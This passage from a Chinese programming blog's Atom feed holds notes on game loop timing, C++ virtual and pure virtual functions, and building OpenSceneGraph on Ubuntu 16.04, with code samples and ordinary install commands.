如果某一次更新耗时太久，则会导致passedFrames和targetTotalFrames差太多，所以就连续更新好几次逻辑来赶上目标的更新次数，以保证游戏的进度稳定*/</span><br><span class="line">while (passedFrames &lt; targetTotalFrames)</span><br><span class="line">&#123;</span><br><span class="line">updateEverything();</span><br><span class="line">passedFrames++;</span><br><span class="line">&#125;</span><br><span class="line">/* 图形更新应该在逻辑完全完成更新以后才进行 */</span><br><span class="line">drawEverything();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="游戏时间"><a href="#游戏时间" class="headerlink" title="游戏时间"></a>游戏时间</h1><p>计算机是通过高分辨率计时器来衡量现实时间的，而游戏时间显然不能和真实事件的时间线一致，每个游戏都会有自身的时间线，该时间线和真实时间是两个平行的世界。开发者可以暂停游戏，冻结时间线，也可以通过某种指令来加速时间线，这些对于游戏的调试非常有帮助。一些游戏也会有一些类似时光倒流或者时间变慢的特殊特效，而这些都是通过操作时间线来完成的。</p><p>现在假设游戏程序以 60 FPS 在运行，则每帧的处理时间大约为16毫秒。如果想要确保帧率稳定运行，每次循环的处理时间都应该小于这个值，剩余的时间，程序进入睡眠状态：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">while(true)</span><br><span class="line">&#123;</span><br><span class="line">    double start = getCurrentTime();</span><br><span class="line"></span><br><span class="line">    processInput();</span><br><span class="line">    udpate();</span><br><span class="line">    render();</span><br><span class="line"></span><br><span class="line">    sleep(start + MS_PER_FRAME - getCurrentTime());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果每帧的处理时间小于16毫秒，sleep 可以保证游戏不会运行的太快。但是如果游戏的每帧超过16毫秒则会出现卡顿现象。</p><p>上面的代码中如果正常的情况下，可以确保每帧推进游戏进程16毫秒，但是因为每帧执行的时间无法固定，会导致帧处理时间超出固定的16毫秒而将游戏拖慢。在无法保证帧处理时间的情况下，我们尝试动态的更新策略，让每帧推进的时间不再是固定的16毫秒，而是根据帧处理的时间来动态调整：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">double lastTime = getCurrentTime();</span><br><span class="line">while (true)</span><br><span class="line">&#123;</span><br><span class="line">    double current = getCurrentTime();</span><br><span class="line">    double elapsed = current - lastTime;</span><br><span class="line">    processInput();</span><br><span class="line">    update(elapsed);</span><br><span class="line">    render();</span><br><span class="line">    lastTime = current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每一帧我们都计算花费的真实时间（elapsed），而这条根据真实时间测量的时间线被称为全局时间线，所有的游戏内部 update() 逻辑都是基于这条全局时间线。update() 函数内部的处理逻辑会根据传入的时间间隔来驱动所有物体的动态效果，每个物体都有自己的局部时间线，这个局部时间线和全局时间线之间存在着一定的比例关系。例如游戏中存在一个飞行的子弹，子弹的飞行距离 = 子弹的飞行速度 * 子弹的飞行时间。这里的飞行时间并不一定是上面提到的全局时间线，可能是它的1/2或者2倍都是可以的，具体的快慢比例完全取决于你的游戏配置，这条和全局时间线比例不同的时间线也就是局部时间线。</p><p>游戏中渲染通常并不会被时间所影响，因为渲染引擎只是单纯的渲染某一时刻的数据逻辑，一般和时间没有关系。受影响的主要是游戏的逻辑更新部分，为了保证不会出现不同硬件的游戏效果不一致，我们可以固定游戏逻辑的更新时间间隔，确保更新频率保持一致。这样做虽然可能导致在配置好的机器上相同的逻辑被渲染多次，但是这显然并不会影响游戏逻辑。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">double previous = getCurrentTime();</span><br><span class="line">double lag = 0.0; </span><br><span class="line">while (true) &#123; </span><br><span class="line">double current = getCurrentTime(); </span><br><span class="line">double elapsed = current - previous; </span><br><span class="line">previous = current; </span><br><span class="line">lag += elapsed;</span><br><span class="line"></span><br><span class="line">processInput();</span><br><span class="line">while (lag &gt;= MS_PER_UPDATE)</span><br><span class="line">&#123;</span><br><span class="line">update();</span><br><span class="line">lag -= MS_PER_UPDATE;</span><br><span class="line">&#125;</span><br><span class="line">    render();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在<strong>游戏渲染时间线和游戏的更新时间线</strong>已经分离，代码中保持游戏的更新时间线以固定的时间间隔推进，这个时间间隔越短，update() 更新的频率越快，越慢更新的频率越低，过慢的更新频率会导致游戏产生抖动现象，不过因为时间步长和硬件不相关，这种现象只会出现在低端机器上。</p><p>通过上面的代码基本上已经可以解决游戏循环的大部分问题了，但是还会出现一种现象，就是当一次循环消耗过长的时间，在下一次游戏渲染的时候，渲染的数据仍然是上一个时间点的数据，而不是真实时间点的数据，这听起来不太容易理解，可以看下面的示意图：</p><p></p><p align="center">    <img src="images/game-loop-timeline.png" width="100%" alt="游戏更新与渲染"></p><p></p><center>图1 游戏更新与渲染不一致</center><p>在图中可以看出这是一个游戏的更新渲染序列，这里看第三次渲染（红点的位置）。因为上一帧的时间花费过长，导致在一帧的逻辑中调用了 update() 两次，进行了两次更新，这时渲染和更新的时间线发生偏移，渲染的真实位置在两次更新逻辑的中间，而渲染的结果却是上一次更新的结果（绿点的位置）。这显然是不对的，因为渲染的结果和现在真实的更新结果并不一样，这时候我们需要计算出二者时间线的偏移值，让渲染的结果符合真实的更新逻辑，也就是说需要计算出从绿点到红点位置的数据变化情况，只有这样渲染的结果才符合常理。</p><p>解决这个问题其实很简单，只需要将偏移的大小告诉渲染逻辑即可，渲染逻辑怎样处理这个偏移时间还需要程序自己来决定。</p><p>将渲染的代码改为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">render(lag / MS_PER_UPDATE);</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="http://blog.jmecn.net/chapter-16-physics-engine/" target="_blank" rel="noopener">第十六章：物理引擎</a>,by 冰点.</li><li><a href="https://www.zhihu.com/question/277300055" target="_blank" rel="noopener">为什么单机游戏中的碰撞很不真实？物理引擎真的很难做到和现实一样吗？</a>,by zhihu.</li><li><a href="http://blog.gifplane.com/2018/10/08/1-UnityOpt14.html" target="_blank" rel="noopener">5.1、Faster Physics(一)</a>,by GIFPlane.</li><li><a href="http://www.luvfight.me/game-loop/" target="_blank" rel="noopener">游戏主循环、帧速控制</a>,by luvfight.</li><li><a href="http://www.luvfight.me/update-components/" target="_blank" rel="noopener">一些游戏程序的基础知识（一）</a>,by luvfight.</li><li><a href="http://www.luvfight.me/draw-components/" target="_blank" rel="noopener">一些游戏程序的基础知识（二）</a>,by luvfight.</li><li><a href="https://www.cnblogs.com/murongxiaopifu/p/7683140.html" target="_blank" rel="noopener">FixedUpdate真的是固定的时间间隔执行吗？聊聊游戏定时器</a>,by 嘉栋.</li><li><a href="https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">欧拉方法</a>,by wikipedia.</li><li><a href="https://wangzhechao.com/2dgames/chapter11/game%20loop.html" target="_blank" rel="noopener">游戏循环</a>,by 没事造轮子.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;游戏引擎提供一系列可视化开发工具和可重用组件。这些工具通过与开发环境进行集成，方便开发者简单、快速进行数据驱动方式的游戏开发。为了提高游戏开发人员的开发效率，引擎开发者会开发出大量的游戏所需要的软件组件。大多数引擎集成了图形、声音、物理和人工智能等功能部件。游戏引擎会被称为
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="3D" scheme="https://huangwang.github.io/tags/3D/"/>
    
  </entry>
  
  <entry>
    <title>C++虚函数与纯虚函数</title>
    <link href="https://huangwang.github.io/2019/09/15/CPlusPlus%E8%99%9A%E5%87%BD%E6%95%B0%E4%B8%8E%E7%BA%AF%E8%99%9A%E5%87%BD%E6%95%B0/"/>
    <id>https://huangwang.github.io/2019/09/15/CPlusPlus虚函数与纯虚函数/</id>
    <published>2019-09-15T13:19:43.000Z</published>
    <updated>2019-09-15T13:27:14.101Z</updated>
    
    <content type="html"><![CDATA[<p>在面向对象程序设计领域，C++、Object Pascal 等语言中有<strong>虚函数</strong>（英语：virtual function）或虚方法（英语：virtual method）的概念。这种函数或方法可以被子类继承和覆盖，通常使用动态调度实现。</p><p><strong>纯虚函数或纯虚方法</strong>是一个需要被非抽象的派生类覆盖（override）的虚函数. 包含纯虚方法的类被称作抽象类; 抽象类不能被直接实例化。 一个抽象基类的一个子类只有在所有的纯虚函数在该类(或其父类)内给出实现时, 才能直接实例化. 纯虚方法通常只有声明(签名)而没有定义(实现)，但有特例情形要求纯虚函数必须给出函数体定义.</p><h1 id="虚函数示例"><a href="#虚函数示例" class="headerlink" title="虚函数示例"></a>虚函数示例</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># include &lt;iostream&gt;</span><br><span class="line"># include &lt;vector&gt;</span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line">class Animal</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    virtual void eat() const &#123; cout &lt;&lt; &quot;I eat like a generic Animal.&quot; &lt;&lt; endl; &#125;</span><br><span class="line">    virtual ~Animal() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">class Wolf : public Animal</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    void eat() const &#123; cout &lt;&lt; &quot;I eat like a wolf!&quot; &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">class Fish : public Animal</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    void eat() const &#123; cout &lt;&lt; &quot;I eat like a fish!&quot; &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">class GoldFish : public Fish</span><br><span class="line">&#123;</span><br><span class="line">public:</span><br><span class="line">    void eat() const &#123; cout &lt;&lt; &quot;I eat like a goldfish!&quot; &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class OtherAnimal : public Animal</span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    std::vector&lt;Animal*&gt; animals;</span><br><span class="line">    animals.push_back( new Animal() );</span><br><span class="line">    animals.push_back( new Wolf() );</span><br><span class="line">    animals.push_back( new Fish() );</span><br><span class="line">    animals.push_back( new GoldFish() );</span><br><span class="line">    animals.push_back( new OtherAnimal() );</span><br><span class="line"> </span><br><span class="line">    for( std::vector&lt;Animal*&gt;::const_iterator it = animals.begin();</span><br><span class="line">       it != animals.end(); ++it) </span><br><span class="line">    &#123;</span><br><span class="line">        (*it)-&gt;eat();</span><br><span class="line">        delete *it;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下是虚函数 Animal::eat() 的输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">I eat like a generic Animal.</span><br><span class="line">I eat like a wolf!</span><br><span class="line">I eat like a fish!</span><br><span class="line">I eat like a goldfish!</span><br><span class="line">I eat like a generic Animal.</span><br></pre></td></tr></table></figure><h1 id="纯虚函数示例"><a href="#纯虚函数示例" class="headerlink" title="纯虚函数示例"></a>纯虚函数示例</h1><p>在C++语言中, 纯虚函数用一种特别的语法[=0]定义。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Abstract &#123;</span><br><span class="line">public:</span><br><span class="line">   virtual void pure_virtual() = 0;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>纯虚函数的定义仅提供方法的原型. 虽然在抽象类中通常不提供纯虚函数的实现, 但是抽象类中可以包含其实现, 而且可以不在声明的同时给出定义[2]. 每个非抽象子类仍然需要重载该方法, 抽象类中实现的调用可以采用以下这种形式:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void Abstract::pure_virtual() &#123;</span><br><span class="line">  // do something</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Child : public Abstract &#123;</span><br><span class="line">  virtual void pure_virtual(); // no longer abstract, this class may be</span><br><span class="line">                               // instantiated.</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">void Child::pure_virtual() &#123;</span><br><span class="line">  Abstract::pure_virtual(); // the implementation in the abstract class </span><br><span class="line">                            // is executed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://blog.csdn.net/Hackbuteer1/article/details/7558868" target="_blank" rel="noopener">虚函数和纯虚函数的区别</a>,by hackbuteer1.</li><li><a href="https://zh.wikipedia.org/wiki/虚函数" target="_blank" rel="noopener">虚函数</a>,by wikipedia.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在面向对象程序设计领域，C++、Object Pascal 等语言中有&lt;strong&gt;虚函数&lt;/strong&gt;（英语：virtual function）或虚方法（英语：virtual method）的概念。这种函数或方法可以被子类继承和覆盖，通常使用动态调度实现。&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="C/C++" scheme="https://huangwang.github.io/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu16.04编译安装OSG</title>
    <link href="https://huangwang.github.io/2019/09/14/Ubuntu16-04%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85OSG/"/>
    <id>https://huangwang.github.io/2019/09/14/Ubuntu16-04编译安装OSG/</id>
    <published>2019-09-14T10:22:43.000Z</published>
    <updated>2019-09-14T11:18:45.819Z</updated>
    
    <content type="html"><![CDATA[<p>OpenSceneGraph是一个开源高性能3D图形工具包，应用程序开发人员在视觉模拟，游戏，虚拟现实，科学可视化和建模等领域使用。 它完全使用标准C ++和OpenGL编写，可在所有Windows平台，OSX，GNU / Linux，IRIX，Solaris，HP-Ux，AIX和FreeBSD操作系统上运行。 OpenSceneGraph现已成为世界领先的场景图技术，广泛应用于视觉，空间，科学，石油天然气，游戏和虚拟现实行业。本文主要记录在Ubuntu 16.04下编译安装OpenSceneGraph的过程。</p><h1 id="下载OSG源代码"><a href="#下载OSG源代码" class="headerlink" title="下载OSG源代码"></a>下载OSG源代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># cd ~/software</span><br><span class="line"># git clone https://github.com/openscenegraph/OpenSceneGraph.git</span><br><span class="line"># git checkout OpenSceneGraph-3.6.4</span><br></pre></td></tr></table></figure><h1 id="下载安装依赖"><a href="#下载安装依赖" class="headerlink" title="下载安装依赖"></a>下载安装依赖</h1><h2 id="安装OSG编译所需依赖"><a href="#安装OSG编译所需依赖" class="headerlink" title="安装OSG编译所需依赖"></a>安装OSG编译所需依赖</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo apt-get build-dep openscenegraph</span><br></pre></td></tr></table></figure><h2 id="下载OSG数据资源"><a href="#下载OSG数据资源" class="headerlink" title="下载OSG数据资源"></a>下载OSG数据资源</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># cd ~/software</span><br><span class="line"># wget http://www.openscenegraph.org/downloads/stable_releases/OpenSceneGraph-3.4.0/data/OpenSceneGraph-Data-3.4.0.zip</span><br><span class="line"># unzip OpenSceneGraph-Data-3.4.0.zip</span><br></pre></td></tr></table></figure><h1 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># cd ~/software/openscenegraph</span><br><span class="line"># cmake .</span><br><span class="line"># make</span><br><span class="line"># sudo make install</span><br><span class="line"># sudo ldconfig -v //如找不到相关osg库，可运行该命令</span><br></pre></td></tr></table></figure><h1 id="运行示例"><a href="#运行示例" class="headerlink" title="运行示例"></a>运行示例</h1><p>编辑.bashrc文件，添加如下环境变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$&#123;PATH&#125;:/home/myaccount/software/OpenSceneGraph/bin</span><br><span class="line">export LD_LIBRARY_PATH=$&#123;LD_LIBRARY_PATH&#125;:/home/myaccount/software/OpenSceneGraph/lib</span><br><span class="line">export OSG_FILE_PATH=/home/myaccount/software/OpenSceneGraph-Data:/home/myaccount/OpenSceneGraph-Data/Images</span><br></pre></td></tr></table></figure><p>使用如下命令运行示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh ./runexamples.bat</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="http://www.openscenegraph.org/index.php/documentation/getting-started" target="_blank" rel="noopener">Getting Started</a>,by OpenSceneGraph.</li><li><a href="https://blog.csdn.net/qing101hua/article/details/53080274" target="_blank" rel="noopener">ubuntu 环境 安装OSG</a>,by qing101hua.</li><li><a href="http://www.openscenegraph.org/index.php/download-section/data" target="_blank" rel="noopener">OSG Data Resources</a>,by OpenSceneGraph.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;OpenSceneGraph是一个开源高性能3D图形工具包，应用程序开发人员在视觉模拟，游戏，虚拟现实，科学可视化和建模等领域使用。 它完全使用标准C ++和OpenGL编写，可在所有Windows平台，OSX，GNU / Linux，IRIX，Solaris，HP-Ux，
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="3D" scheme="https://huangwang.github.io/tags/3D/"/>
    
      <category term="计算机图形学" scheme="https://huangwang.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"/>
    
  </entry>
  
</feed>
